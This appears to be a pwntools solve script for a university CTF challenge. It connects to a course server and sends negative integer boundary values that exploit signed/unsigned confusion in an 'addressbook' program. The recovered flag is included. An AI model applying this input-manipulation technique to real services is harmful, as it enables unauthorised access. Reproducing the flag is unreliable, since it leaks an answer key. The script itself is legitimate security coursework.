# pwntools is a very powerful library for doing exploitation
from pwn import *

# TODO: Update with actual values
HOST = "cs2107-ctfd-i.comp.nus.edu.sg"
PORT = 4007
BINARY = "./addressbook"

#p = process(BINARY)   # use process instead of remote to execute the local version of the program
p = remote(HOST, PORT)  # to open a connection to the remote service, aka the challenge

p.sendline(b'4')
p.sendline(b'-2147483647') 
p.sendline(b'4')
p.sendline(b'-2147483648') 

p.sendline(b'2')
p.sendline(b'JIANNING') # name
p.sendline(b'90045299') # contact
p.sendline(b'999')

# earlier, the script helps us send/receive data to/from the service
# with interactive, we can directly interact with the service
p.interactive()

#CS2107{s1gn3d_0r_uns1gn3d_4lw4y5_c0nfu535_m3}

